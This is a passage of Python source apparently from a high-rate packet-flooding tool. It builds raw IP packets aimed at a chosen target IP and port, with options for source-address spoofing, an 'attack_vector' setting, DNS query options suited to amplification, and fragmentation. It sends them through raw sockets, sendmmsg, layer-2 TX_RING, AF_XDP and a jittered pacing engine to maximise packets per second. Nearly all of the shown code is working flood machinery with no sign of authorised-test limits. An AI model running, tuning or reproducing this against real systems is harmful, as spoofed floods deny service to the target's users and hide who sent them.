            acc["sender_path"] = str(it.get("sender_path") or "")
    return _recompute_loss_metrics(acc)

async def send_packet_async(packet, verbose, packet_no, loop, protocol):
    """Asynchronously send a packet using scapy in a thread executor."""
    def send_pkt(pkt):
        try:
            scapy = _scapy()
            iface = scapy.get_working_if()
            if pkt.haslayer('Ether'):
                scapy.sendp(pkt, iface=iface, realtime=True, verbose=False, return_packets=False)
            else:
                # L3 send should rely on OS routing, specifying iface can cause ARP issues
                scapy.send(pkt, realtime=True, verbose=False, return_packets=False)
            return True
        except ScapyUnavailableError:
            logging.error("Scapy is unavailable; cannot send packets in CPU/Scapy mode.")
            return False
        except Exception:
            logging.error(f"Packet send error for packet {packet_no}:\n{traceback.format_exc()}")
            return False

    result = await loop.run_in_executor(None, send_pkt, packet)
    
    if result and verbose:
        logging.info(f"Packet {packet_no} sent.")
    elif not result:
        logging.error(f"Packet {packet_no} failed to send.")
    
    return result

async def packet_sender(packet_config, count, delay=0.0, rps=0.0, jitter=0.0, ramp=0.0, verbose=False, live_sent=None, live_errors=None, live_progress=None):
    """
    Sends packets based on the provided configuration.
    Uses the zero-dependency CPU Packet Engine for fast packet generation,
    then sends via raw socket.  Falls back to Scapy only if the engine fails.
    """
    loop = asyncio.get_running_loop()
    sent_ok = 0
    send_err = 0
    packet_no = 0

    # Build a cpu_packet_engine.PacketConfig from the Scapy-compat config
    try:
        spoof_opts = None
        if hasattr(packet_config, 'spoof_opts') and packet_config.spoof_opts:
            spoof_opts = cpu_packet_engine.SpoofingOptions(
                mode=getattr(packet_config.spoof_opts, 'mode', 'realistic'),
                subnet=getattr(packet_config.spoof_opts, 'subnet', None),
                list_file=getattr(packet_config.spoof_opts, 'list_file', None),
            )

        engine_cfg = cpu_packet_engine.PacketConfig(
            target_ip=packet_config.target_ip,
            target_port=packet_config.target_port,
            protocol=getattr(packet_config, 'protocol', 'tcp'),
            spoof=getattr(packet_config, 'spoof', False),
            spoof_opts=spoof_opts,
            payload=getattr(packet_config, 'payload', None),
            tcp_flags=getattr(packet_config, 'tcp_flags', 'S'),
            ttl=getattr(packet_config, 'ttl', None),
            tos=getattr(packet_config, 'tos', None),
            window=getattr(packet_config, 'window', None),
            fragment_enabled=getattr(packet_config, 'fragment_enabled', False),
            fragment_size=getattr(packet_config, 'fragment_size', 800),
            pad_size=getattr(packet_config, 'pad_size', 0),
            attack_vector=getattr(packet_config, 'attack_vector', 'basic'),
            dns_name=getattr(packet_config, 'dns_name', 'example.com'),
            dns_qtype=getattr(packet_config, 'dns_qtype', 'A'),
            dns_edns=getattr(packet_config, 'dns_edns', False),
            dns_recursive=getattr(packet_config, 'dns_recursive', True),
        )
        use_cpu_engine = True
    except Exception as e:
        log_error(f"CPU Packet Engine config failed, falling back to Scapy: {e}")
        use_cpu_engine = False

    if use_cpu_engine:
        # ── Fast path: raw socket + CPU engine ──
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log_error("Raw socket creation failed. Please run with sudo/root.")
            return _stats(attempted=count, sent=0, errors=count)
        except Exception as e:
            log_error(f"Failed to create raw socket: {e}")
            return _stats(attempted=count, sent=0, errors=count)

        # Batch size for async yield
        BATCH_SIZE = 256
        dst_addr = (engine_cfg.target_ip, 0)
        sent_ok_snapshot = 0
        send_err_snapshot = 0

        try:
            for i in range(count):
                pkt_bytes = cpu_packet_engine.create_packet(engine_cfg)

                # Fragmentation
                if engine_cfg.fragment_enabled:
                    fragments = cpu_packet_engine.fragment_packet(
                        pkt_bytes,
                        fragment_size=max(8, engine_cfg.fragment_size),
                    )
                else:
                    fragments = [pkt_bytes]

                for frag in fragments:
                    packet_no += 1
                    try:
                        sock.sendto(frag, dst_addr)
                        sent_ok += 1
                    except Exception:
                        send_err += 1

                _update_live(live_progress, 1)

                # Rate limiting
                base_delay = 0.0
                if rps and rps > 0:
                    base_delay = 1.0 / float(rps)
                elif delay and delay > 0:
                    base_delay = float(delay)

                if base_delay > 0:
                    if jitter and jitter > 0:
                        j = base_delay * float(jitter)
                        await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
                    else:
                        await asyncio.sleep(base_delay)

                # Yield every batch to keep event loop responsive
                if (i + 1) % BATCH_SIZE == 0:
                    _update_live(live_sent, sent_ok - sent_ok_snapshot)
                    _update_live(live_errors, send_err - send_err_snapshot)
                    sent_ok_snapshot = sent_ok
                    send_err_snapshot = send_err
                    await asyncio.sleep(0)

        except KeyboardInterrupt:
            pass
        finally:
            sock.close()

        _update_live(live_sent, sent_ok - sent_ok_snapshot)
        _update_live(live_errors, send_err - send_err_snapshot)

        return _stats(
            attempted=packet_no,
            sent=sent_ok,
            errors=max(0, packet_no - sent_ok) if send_err <= 0 else send_err,
            bytes_sent_est=sent_ok * len(pkt_bytes) if count > 0 else 0,
        )

    # ── Scapy fallback path ──
    try:
        scapy = _scapy()
    except ScapyUnavailableError:
        log_error("Both CPU Engine and Scapy unavailable; packet_sender cannot run.")
        return _stats(attempted=count, sent=0, errors=count)

    tasks = []
    MAX_INFLIGHT_TASKS = 1024

    async def _flush():
        nonlocal sent_ok, send_err
        if not tasks:
            return
        results = await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        batch_sent = sum(1 for r in results if r is True)
        batch_err = len(results) - batch_sent
        sent_ok += batch_sent
        send_err += batch_err
        _update_live(live_sent, batch_sent)
        _update_live(live_errors, batch_err)

    for i in range(count):
        pkt = packet_utils.create_packet(packet_config)
        pkts_to_send = [pkt]

        if getattr(packet_config, "fragment_enabled", False):
            frag_size = int(getattr(packet_config, "fragment_size", 800) or 800)
            frag_size = max(8, frag_size)
            try:
                pkts_to_send = scapy.fragment(pkt, fragsize=frag_size)
            except Exception:
                pkts_to_send = [pkt]

        for p in pkts_to_send:
            packet_no += 1
            _update_live(live_progress, 1)
            tasks.append(loop.create_task(send_packet_async(p, verbose, packet_no, loop, packet_config.protocol)))
            if len(tasks) >= MAX_INFLIGHT_TASKS:
                await _flush()

        base_delay = 0.0
        if rps and rps > 0:
            base_delay = 1.0 / float(rps)
        elif delay and delay > 0:
            base_delay = float(delay)

        if base_delay > 0:
            if jitter and jitter > 0:
                j = base_delay * float(jitter)
                await asyncio.sleep(max(0.0, base_delay + random.uniform(-j, j)))
            else:
                await asyncio.sleep(base_delay)

    if tasks:
        await _flush()
    return _stats(
        attempted=packet_no,
        sent=sent_ok,
        errors=max(0, packet_no - sent_ok) if send_err <= 0 else send_err,
    )

# Lazy import fast_sender C extension
try:
    from . import fast_sender
    FAST_SENDER_AVAILABLE = True
except ImportError:
    FAST_SENDER_AVAILABLE = False

# Lazy import pacing engine
try:
    from .pacing import (
        PacingConfig, PacingMode, JitterModel,
        paced_send, paced_send_l2, get_stats, reset_stats, format_stats, cleanup_l2,
        PACING_ENGINE_AVAILABLE,
    )
except ImportError:
    PACING_ENGINE_AVAILABLE = False
    PacingConfig = None
    reset_stats = None

# Lazy import AF_XDP sender module
try:
    from .af_xdp_sender import XDPSender, XDPIntegration, check_xdp_available
    XDP_AVAILABLE = True
except ImportError:
    XDP_AVAILABLE = False
    XDPSender = None
    XDPIntegration = None
    check_xdp_available = lambda: (False, "AF_XDP module not available")


def get_gateway_info(target_ip):
    """
    Hedef IP için çıkış arayüzünü ve Gateway MAC adresini bulur.
    """
    cached = _GATEWAY_CACHE.get(target_ip)
    if cached is not None:
        ts, iface, mac_bytes = cached
        if (time.monotonic() - ts) <= _GATEWAY_CACHE_TTL_SEC:
            return iface, mac_bytes
    try:
        scapy = _scapy()
        conf = scapy.conf
        getmacbyip = scapy.getmacbyip
        # Get the interface and gateway IP for the target
        # conf.route.route(target_ip) returns (iface, gw_ip, src_ip)
        res = conf.route.route(target_ip)
        iface = res[0]
        gw_ip = res[1]
        
        # Resolve the MAC address of the gateway
        mac_str = getmacbyip(gw_ip)
        
        if not mac_str:
            # Fallback: try to read from /proc/net/arp (doesn't require root)
            try:
                with open("/proc/net/arp", "r") as f:
                    for line in f.readlines()[1:]:
                        parts = line.split() 
                        if len(parts) >= 4 and parts[0] == gw_ip:
                            mac_str = parts[3]
                            if mac_str != "00:00:00:00:00:00":
                                break
                            else:
                                mac_str = None
            except Exception:
                pass

        if not mac_str:
            # Fallback: try to get MAC of the target directly if no gateway (local network)
            mac_str = getmacbyip(target_ip)
            
        if not mac_str:
            log_error(f"Could not resolve MAC for gateway {gw_ip} or target {target_ip}")
            return iface, None

        mac_bytes = bytes.fromhex(mac_str.replace(":", ""))
        
        # DEBUG: Log MAC address for verification
        log_info(f"Gateway MAC resolved: {mac_str} ({len(mac_bytes)} bytes) on {iface}")
        _GATEWAY_CACHE[target_ip] = (time.monotonic(), iface, mac_bytes)
        return iface, mac_bytes
    except ScapyUnavailableError:
        log_error("Scapy is unavailable; cannot resolve gateway MAC.")
        return None, None
    except Exception as e:
        log_error(f"get_gateway_info error: {e}")
        return None, None


# ============================================================================
# AF_XDP High-Performance Sender
# ============================================================================

async def xdp_sender(
    packets_buffer: bytes,
    target_ip: str,
    target_port: int,
    count: int,
    verbose: bool = False,
    interface: str = None,
    batch_size: int = 64
) -> int:
    """
    Send packets using AF_XDP for maximum performance.
    
    This function provides the highest possible packet-per-second rate
    by using Linux AF_XDP sockets (Copy Mode for compatibility).
    
    Args:
        packets_buffer: Contiguous buffer of raw IP packets
        target_ip: Target IP address (for interface detection)
        target_port: Target port (for logging)
        count: Number of packets in buffer
        verbose: Enable verbose logging
        interface: Network interface (auto-detected if None)
        batch_size: Batch size for TX
    
    Returns:
        Number of packets sent
    
    Requirements:
        - Linux kernel >= 4.18
        - Root privileges
        - XDP extension built (python setup.py build_ext --inplace)
    """
    if not XDP_AVAILABLE:
        log_error("[XDP] AF_XDP module not available. Build with: python setup.py build_ext --inplace")
        log_info("[XDP] Falling back to raw_socket_sender...")
        return await raw_socket_sender(packets_buffer, target_ip, target_port, count, verbose)
    
    # Check XDP availability
    available, msg = check_xdp_available()
    if not available:
        log_error(f"[XDP] Not available: {msg}")
        log_info("[XDP] Falling back to raw_socket_sender...")
        return await raw_socket_sender(packets_buffer, target_ip, target_port, count, verbose)
    
    # Calculate packet size
    packet_size = len(packets_buffer) // count if count > 0 else 0
    if packet_size == 0:
        log_error("[XDP] Invalid packet buffer")
        return _stats(attempted=count, sent=0, errors=count)
    packets_buffer, normalize_meta = _normalize_packets_buffer(
        packets_buffer,
        required_bytes=packet_size * count,
        pool_key="senders_xdp_tx",
        return_meta=True,
    )
    
    log_info(f"[XDP] Initializing AF_XDP sender for {target_ip}:{target_port}")
    log_info(f"[XDP] Packets: {count}, Packet Size: {packet_size} bytes, Batch Size: {batch_size}")
    
    total_sent = 0
    
    try:
        # Create sender with auto-fallback
        sender = XDPSender(
            interface=interface,
            batch_size=batch_size,
            auto_fallback=True
        )
        
        sender.start()
        
        if sender.is_using_xdp:
            log_info(f"[XDP] Using AF_XDP on interface: {sender.interface}")
        else:
            log_info(f"[XDP] Using fallback mode on interface: {sender.interface}")
        
        # Prefer contiguous-buffer API when available to avoid Python list overhead.
        if hasattr(sender, "send_buffer"):
            sent = sender.send_buffer(packets_buffer, packet_size, count)
            total_sent = int(sent or 0)
        else:
            # Fallback path: send batch lists.
            mv = memoryview(packets_buffer)
            needs_bytes = False
            batch_start = 0
            while batch_start < count:
                batch_end = min(batch_start + batch_size, count)
                batch_views = []
                for i in range(batch_start, batch_end):
                    start = i * packet_size
                    end = start + packet_size
                    batch_views.append(mv[start:end])

                if needs_bytes:
                    sent = sender.send([bytes(v) for v in batch_views])
                else:
                    try:
                        sent = sender.send(batch_views)  # may work if extension uses buffer protocol
                    except TypeError:
                        needs_bytes = True
                        sent = sender.send([bytes(v) for v in batch_views])

                total_sent += sent

                if verbose and total_sent % 10000 < batch_size:
                    stats = sender.get_stats()
                    log_info(f"[XDP] Progress: {total_sent}/{count} packets, "
                            f"{stats.packets_per_second:.0f} pps, {stats.mbps:.2f} Mbps")

                batch_start = batch_end
        
        # Get final stats
        stats = sender.get_stats()
        log_info(f"[XDP] Completed: {stats.tx_packets:,} packets, "
                f"{stats.tx_bytes:,} bytes, "
                f"{stats.packets_per_second:,.0f} pps, "
                f"{stats.mbps:.2f} Mbps")
        
        sender.stop()
        
    except Exception as e:
        log_error(f"[XDP] Error: {e}")
        if verbose:
            import traceback
            traceback.print_exc()
        
        # Fallback to raw socket
        log_info("[XDP] Falling back to raw_socket_sender...")
        return await raw_socket_sender(packets_buffer, target_ip, target_port, count, verbose)
    
    return _stats(
        attempted=count,
        sent=total_sent,
        errors=max(0, count - total_sent),
        bytes_sent_est=total_sent * packet_size,
        buffer_copy_count=int(normalize_meta.get("buffer_copy_count", 0) or 0),
        buffer_copy_bytes=int(normalize_meta.get("buffer_copy_bytes", 0) or 0),
        eagain_retry_count=0,
        partial_send_retry_count=0,
    )


async def raw_socket_sender(
    packets_buffer,
    target_ip,
    target_port,
    count,
    verbose,
    live_sent=None,
    live_errors=None,
    live_progress=None,
    force_l2=False,
):
    """
    Sends a buffer of pre-created raw packets using a raw socket.
    Optimized with C extension (fast_sender) or sendmmsg for Linux.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        log_error("Raw socket creation failed. Please run the script with sudo/root privileges.")
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="NONE",
            permission_error_count=1,
            fallback_count=0,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
    except Exception as e:
        log_error(f"Failed to create raw socket: {e}")
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="NONE",
            permission_error_count=0,
            fallback_count=0,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )

    log_info(f"Raw socket sender initialized. Sending {count} packets...")
    
    packet_size = len(packets_buffer) // count if count > 0 else 0
    if packet_size == 0 and count > 0:
        log_error("Packet buffer is empty or count is zero, cannot determine packet size.")
        s.close()
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
    packets_buffer, normalize_meta = _normalize_packets_buffer(
        packets_buffer,
        required_bytes=packet_size * count,
        pool_key="senders_raw_tx",
        return_meta=True,
    )

    sent_total = 0
    sender_path = "PYTHON_SENDTO"  # default fallback
    fallback_count = 0
    permission_error_count = 0
    eagain_retry_count = 0
    partial_send_retry_count = 0
    buffer_copy_count = int(normalize_meta.get("buffer_copy_count", 0) or 0)
    buffer_copy_bytes = int(normalize_meta.get("buffer_copy_bytes", 0) or 0)
    txring_flush_call_count = 0
    txring_flush_error_count = 0
    txring_flush_eagain_count = 0
    txring_flush_enobufs_count = 0
    txring_flush_ebusy_count = 0
    txring_flush_other_errno_count = 0
    txring_flush_last_errno = 0
    txring_flush_last_errno_name = "NONE"
    txring_frame_wait_ns = 0
    txring_poll_count = 0
    flush_mode = "unknown"
    txring_tp_packets = 0
    txring_tp_drops = 0
    txring_tp_freeze_q_cnt = 0
    txring_packet_version = 0
    txring_packet_version_name = "TPACKET_UNKNOWN"
    buffer_reuse_hits = 0

    loss_iface_hint = _resolve_loss_iface(None)
    loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)

    if bool(force_l2) and not FAST_SENDER_AVAILABLE:
        s.close()
        _update_live(live_progress, int(count))
        _update_live(live_errors, int(count))
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="L2_UNAVAILABLE",
            permission_error_count=0,
            fallback_count=1,
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )

    # 1. Try C Extension (Fastest)
    if FAST_SENDER_AVAILABLE:
        # 1.a Try TX_RING (L2 Zero-Copy) - Ultra Fast
        if hasattr(fast_sender, 'send_ring_optimized'):
            try:
                iface, gateway_mac = get_gateway_info(target_ip)
                if iface and gateway_mac:
                    if not str(os.environ.get("SAMURAI_LOSS_IFACE", "") or "").strip():
                        loss_iface_hint = str(iface)
                        loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)
                    # Validate MAC length
                    if len(gateway_mac) != 6:
                        log_error(f"Invalid MAC address length: {len(gateway_mac)} (expected 6)")
                    else:
                        # iface string, buffer, size, count, mac bytes
                        log_info(f"[TX_RING] Starting zero-copy L2 send with MAC: {gateway_mac.hex()}")
                        if hasattr(fast_sender, "send_ring_optimized_ex"):
                            tx_result = fast_sender.send_ring_optimized_ex(
                                iface, packets_buffer, packet_size, count, gateway_mac
                            )
                            if isinstance(tx_result, dict):
                                sent = int(tx_result.get("sent", 0) or 0)
                                txring_flush_call_count += int(tx_result.get("txring_flush_call_count", 0) or 0)
                                txring_flush_error_count += int(tx_result.get("txring_flush_error_count", 0) or 0)
                                txring_flush_eagain_count += int(tx_result.get("txring_flush_eagain_count", 0) or 0)
                                txring_flush_enobufs_count += int(tx_result.get("txring_flush_enobufs_count", 0) or 0)
                                txring_flush_ebusy_count += int(tx_result.get("txring_flush_ebusy_count", 0) or 0)
                                txring_flush_other_errno_count += int(
                                    tx_result.get("txring_flush_other_errno_count", 0) or 0
                                )
                                txring_flush_last_errno = int(tx_result.get("txring_flush_last_errno", 0) or 0)
                                txring_flush_last_errno_name = str(
                                    tx_result.get("txring_flush_last_errno_name", "NONE") or "NONE"
                                )
                                txring_frame_wait_ns += int(tx_result.get("txring_frame_wait_ns", 0) or 0)
                                txring_poll_count += int(tx_result.get("txring_poll_count", 0) or 0)
                                _tx_flush_mode = str(tx_result.get("flush_mode", "") or "").strip()
                                if _tx_flush_mode:
                                    if flush_mode in ("", "unknown"):
                                        flush_mode = _tx_flush_mode
                                    elif flush_mode != _tx_flush_mode:
                                        flush_mode = "mixed"
                                txring_tp_packets += int(tx_result.get("txring_tp_packets", 0) or 0)
                                txring_tp_drops += int(tx_result.get("txring_tp_drops", 0) or 0)
                                txring_tp_freeze_q_cnt += int(tx_result.get("txring_tp_freeze_q_cnt", 0) or 0)
                                txring_packet_version = int(tx_result.get("txring_packet_version", 0) or 0)
                                txring_packet_version_name = str(
                                    tx_result.get("txring_packet_version_name", "TPACKET_UNKNOWN") or "TPACKET_UNKNOWN"
                                )
                            else:
                                sent = int(tx_result or 0)
                        else:
                            sent = int(
                                fast_sender.send_ring_optimized(
                                    iface, packets_buffer, packet_size, count, gateway_mac
                                )
                                or 0
                            )
                        log_info(f"Fast Sender (TX_RING L2) finished. Sent {sent} packets via {iface}.")
                        s.close()
                        sent_total = int(sent or 0)
                        _update_live(live_progress, count)
                        _update_live(live_sent, sent_total)
                        _update_live(live_errors, max(0, count - sent_total))
                        out = _stats(
                            attempted=count,
                            sent=sent_total,
                            errors=max(0, count - sent_total),
                            bytes_sent_est=sent_total * packet_size,
                            sender_path="TX_RING_L2",
                            permission_error_count=0,
                            fallback_count=0,
                            buffer_copy_count=buffer_copy_count,
                            buffer_copy_bytes=buffer_copy_bytes,
                            eagain_retry_count=eagain_retry_count,
                            partial_send_retry_count=partial_send_retry_count,
                            buffer_reuse_hits=buffer_reuse_hits,
                            txring_flush_call_count=txring_flush_call_count,
                            txring_flush_error_count=txring_flush_error_count,
                            txring_flush_eagain_count=txring_flush_eagain_count,
                            txring_flush_enobufs_count=txring_flush_enobufs_count,
                            txring_flush_ebusy_count=txring_flush_ebusy_count,
                            txring_flush_other_errno_count=txring_flush_other_errno_count,
                            txring_flush_last_errno=txring_flush_last_errno,
                            txring_flush_last_errno_name=txring_flush_last_errno_name,
                            txring_frame_wait_ns=txring_frame_wait_ns,
                            txring_poll_count=txring_poll_count,
                            flush_mode=flush_mode,
                            txring_tp_packets=txring_tp_packets,
                            txring_tp_drops=txring_tp_drops,
                            txring_tp_freeze_q_cnt=txring_tp_freeze_q_cnt,
                            txring_packet_version=txring_packet_version,
                            txring_packet_version_name=txring_packet_version_name,
                        )
                        return _attach_loss_telemetry(
                            out, loss_before_snapshot, preferred_iface=loss_iface_hint
                        )
                else:
                    fallback_count += 1
                    if verbose:
                        log_error("Gateway MAC not found for TX_RING, falling back to L3.")
            except Exception as e:
                fallback_count += 1
                if verbose:
                    log_error(f"TX_RING failed, falling back to L3: {e}")

        if bool(force_l2):
            s.close()
            _update_live(live_progress, int(count))
            _update_live(live_errors, int(count))
            return _stats(
                attempted=count,
                sent=0,
                errors=count,
                sender_path="L2_UNAVAILABLE",
                permission_error_count=0,
                fallback_count=max(1, fallback_count),
                buffer_copy_count=buffer_copy_count,
                buffer_copy_bytes=buffer_copy_bytes,
                eagain_retry_count=eagain_retry_count,
                partial_send_retry_count=partial_send_retry_count,
                buffer_reuse_hits=buffer_reuse_hits,
            )

        # 1.b Try Standard sendmmsg (L3)
        try:
            cext_result = fast_sender.send_optimized(
                s.fileno(), packets_buffer, target_ip, target_port, packet_size, count
            )
            if isinstance(cext_result, dict):
                sent = int(cext_result.get("sent", 0) or 0)
                eagain_retry_count += int(cext_result.get("eagain_retry_count", 0) or 0)
                partial_send_retry_count += int(cext_result.get("partial_send_retry_count", 0) or 0)
            else:
                sent = int(cext_result or 0)
            log_info(f"Fast Sender (C Ext L3) finished. Sent {sent} packets.")
            s.close()
            sent_total = sent
            _update_live(live_progress, count)
            _update_live(live_sent, sent_total)
            _update_live(live_errors, max(0, count - sent_total))
            out = _stats(
                attempted=count,
                sent=sent_total,
                errors=max(0, count - sent_total),
                bytes_sent_est=sent_total * packet_size,
                sender_path="C_EXT_L3",
                permission_error_count=0,
                fallback_count=fallback_count,
                buffer_copy_count=buffer_copy_count,
                buffer_copy_bytes=buffer_copy_bytes,
                eagain_retry_count=eagain_retry_count,
                partial_send_retry_count=partial_send_retry_count,
                buffer_reuse_hits=buffer_reuse_hits,
            )
            return _attach_loss_telemetry(
                out, loss_before_snapshot, preferred_iface=loss_iface_hint
            )
        except Exception as e:
            fallback_count += 1
            log_error(f"Fast Sender failed, falling back to Python: {e}")

    try:
        # Create memoryview to avoid copying
        mv = memoryview(packets_buffer)
        
        # Prepare batches for sendmmsg (Linux only)
        # Python's sendmmsg takes an iterable of (data, ancdata)
        # We can send in batches of e.g. 512 packets
        BATCH_SIZE = 512
        address = (target_ip, target_port)
        
        total_sent = 0
        
        if hasattr(s, 'sendmmsg'):
            sender_path = "PYTHON_SENDMMSG"
            prebuilt_datagrams = None
            reuse_sendmmsg = str(os.environ.get("SAMURAI_SENDMMSG_REUSE", "1") or "1").strip().lower() not in {
                "0", "false", "no", "off"
            }
            try:
                max_reuse_count = int(os.environ.get("SAMURAI_SENDMMSG_REUSE_MAX", "131072") or 131072)
            except Exception:
                max_reuse_count = 131072
            if reuse_sendmmsg and 0 < count <= max_reuse_count:
                try:
                    packet_views = [mv[(idx * packet_size):((idx + 1) * packet_size)] for idx in range(count)]
                    prebuilt_datagrams = [(pkt_view, []) for pkt_view in packet_views]
                    buffer_reuse_hits += 1
                except Exception:
                    prebuilt_datagrams = None

            for i in range(0, count, BATCH_SIZE):
                batch_end = min(i + BATCH_SIZE, count)
                batch_count = batch_end - i

                if prebuilt_datagrams is not None:
                    datagrams = prebuilt_datagrams[i:batch_end]
                else:
                    datagrams = []
                    for j in range(batch_count):
                        idx = i + j
                        start = idx * packet_size
                        end = start + packet_size
                        datagrams.append((mv[start:end], []))

                batch_progress = 0
                batch_index = 0
                consecutive_eagain = 0
                while batch_index < batch_count:
                    pending = batch_count - batch_index
                    try:
                        sent_msgs = s.sendmmsg(datagrams[batch_index:], 0, address)
                        sent_msgs = int(sent_msgs or 0)
                        if sent_msgs <= 0:
                            # Defensive retry when kernel returns 0 without raising.
                            eagain_retry_count += 1
                            consecutive_eagain += 1
                            if consecutive_eagain >= 1024:
                                _update_live(live_errors, pending)
                                batch_progress += pending
                                batch_index = batch_count
                            continue

                        total_sent += sent_msgs
                        batch_index += sent_msgs
                        batch_progress += sent_msgs
                        _update_live(live_sent, sent_msgs)
                        consecutive_eagain = 0

                        if sent_msgs < pending:
                            partial_send_retry_count += 1
                    except PermissionError:
                        permission_error_count += 1
                        _update_live(live_errors, pending)
                        batch_progress += pending
                        batch_index = batch_count
                    except OSError as exc:
                        if exc.errno == errno.EINTR:
                            continue
                        if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                            eagain_retry_count += 1
                            consecutive_eagain += 1
                            if consecutive_eagain >= 1024:
                                _update_live(live_errors, pending)
                                batch_progress += pending
                                batch_index = batch_count
                            continue
                        _update_live(live_errors, pending)
                        batch_progress += pending
                        batch_index = batch_count
                    except Exception:
                        _update_live(live_errors, pending)
                        batch_progress += pending
                        batch_index = batch_count

                _update_live(live_progress, batch_progress)
                
                if verbose and total_sent % 10000 < BATCH_SIZE:
                     log_info(f"Sent {total_sent}/{count} raw packets (sendmmsg)...")
        else:
            sender_path = "PYTHON_SENDTO"
            for i in range(count):
                _update_live(live_progress, 1)
                start = i * packet_size
                end = start + packet_size
                try:
                    s.sendto(mv[start:end], address)
                    total_sent += 1
                    _update_live(live_sent, 1)
                except PermissionError:
                    permission_error_count += 1
                    _update_live(live_errors, 1)
                except Exception:
                    _update_live(live_errors, 1)
                if verbose and i % 10000 == 0:
                    log_info(f"Sent {i}/{count} raw packets...")
        sent_total = int(total_sent)

    except Exception as e:
        log_error(f"Error during raw socket sending: {e}")
        if verbose:
            traceback.print_exc()
    finally:
        s.close()
        if FAST_SENDER_AVAILABLE and hasattr(fast_sender, 'cleanup_ring'):
            fast_sender.cleanup_ring()
        log_info(f"Raw socket sender finished sending {count} packets.")
    out = _stats(
        attempted=count,
        sent=sent_total,
        errors=max(0, count - sent_total),
        bytes_sent_est=sent_total * packet_size,
        sender_path=sender_path,
        permission_error_count=permission_error_count,
        fallback_count=fallback_count,
        buffer_copy_count=buffer_copy_count,
        buffer_copy_bytes=buffer_copy_bytes,
        eagain_retry_count=eagain_retry_count,
        partial_send_retry_count=partial_send_retry_count,
        buffer_reuse_hits=buffer_reuse_hits,
        txring_flush_call_count=txring_flush_call_count,
        txring_flush_error_count=txring_flush_error_count,
        txring_flush_eagain_count=txring_flush_eagain_count,
        txring_flush_enobufs_count=txring_flush_enobufs_count,
        txring_flush_ebusy_count=txring_flush_ebusy_count,
        txring_flush_other_errno_count=txring_flush_other_errno_count,
        txring_flush_last_errno=txring_flush_last_errno,
        txring_flush_last_errno_name=txring_flush_last_errno_name,
        txring_frame_wait_ns=txring_frame_wait_ns,
        txring_poll_count=txring_poll_count,
        flush_mode=flush_mode,
        txring_tp_packets=txring_tp_packets,
        txring_tp_drops=txring_tp_drops,
        txring_tp_freeze_q_cnt=txring_tp_freeze_q_cnt,
        txring_packet_version=txring_packet_version,
        txring_packet_version_name=txring_packet_version_name,
    )
    return _attach_loss_telemetry(out, loss_before_snapshot, preferred_iface=loss_iface_hint)


async def paced_raw_socket_sender(
    packets_buffer,
    target_ip,
    target_port,
    count,
    verbose,
    pacing_config=None,
    force_l2=False,
    live_sent=None,
    live_errors=None,
    live_progress=None,
):
    """
    Pacing-aware wrapper around raw packet sending.
    Supports live metrics by updating shared counters.
    """
    # --- Fast path: no pacing requested → bypass ---
    if (
        pacing_config is None
        or pacing_config.pacing_mode == 0            # PacingMode.NONE
        or not PACING_ENGINE_AVAILABLE
    ):
        return await raw_socket_sender(
            packets_buffer, target_ip, target_port, count, verbose,
            live_sent=live_sent, live_errors=live_errors, live_progress=live_progress,
            force_l2=force_l2,
        )

    packet_size = len(packets_buffer) // count if count > 0 else 0
    if packet_size == 0:
        log_error("[Pacing] Invalid packet buffer (size=0)")
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
    packets_buffer, normalize_meta = _normalize_packets_buffer(
        packets_buffer,
        required_bytes=packet_size * count,
        pool_key="senders_pacing_tx",
        return_meta=True,
    )
    buffer_copy_count = int(normalize_meta.get("buffer_copy_count", 0) or 0)
    buffer_copy_bytes = int(normalize_meta.get("buffer_copy_bytes", 0) or 0)
    loss_iface_hint = _resolve_loss_iface(None)
    loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)
    progress_reported = 0

    log_info(
        f"[Pacing] C engine: mode={pacing_config.pacing_mode.name}, "
        f"rps={pacing_config.target_rps:.0f}, ipg={pacing_config.ipg_ns}ns, "
        f"burst={pacing_config.burst_size}, jitter={pacing_config.jitter_model.name} "
        f"±{pacing_config.jitter_pct*100:.0f}%"
    )

    # --- Try L2 (TX_RING) path first if fast_sender is available ---
    if FAST_SENDER_AVAILABLE:
        try:
            iface, gateway_mac = get_gateway_info(target_ip)
            if iface and gateway_mac and len(gateway_mac) == 6:
                if not str(os.environ.get("SAMURAI_LOSS_IFACE", "") or "").strip():
                    loss_iface_hint = str(iface)
                    loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)
                log_info(f"[Pacing] Using L2 paced sender on {iface}")
                loop = asyncio.get_running_loop()
                try:
                    if callable(reset_stats):
                        reset_stats()
                except Exception:
                    pass
                progress_budget = max(0, int(count) - int(progress_reported))
                try:
                    sent, progress_emitted = await _run_paced_send_with_live_progress(
                        lambda: paced_send_l2(
                            iface,
                            packets_buffer,
                            packet_size,
                            count,
                            gateway_mac,
                            config=pacing_config,
                        ),
                        pacing_config=pacing_config,
                        progress_budget=progress_budget,
                        live_progress=live_progress,
                    )
                    progress_reported += int(progress_emitted)
                except _PacedSendRuntimeError as exc:
                    progress_reported += int(exc.progress_emitted)
                    raise exc.cause
                # Log pacing statistics
                stats = get_stats()
                if stats:
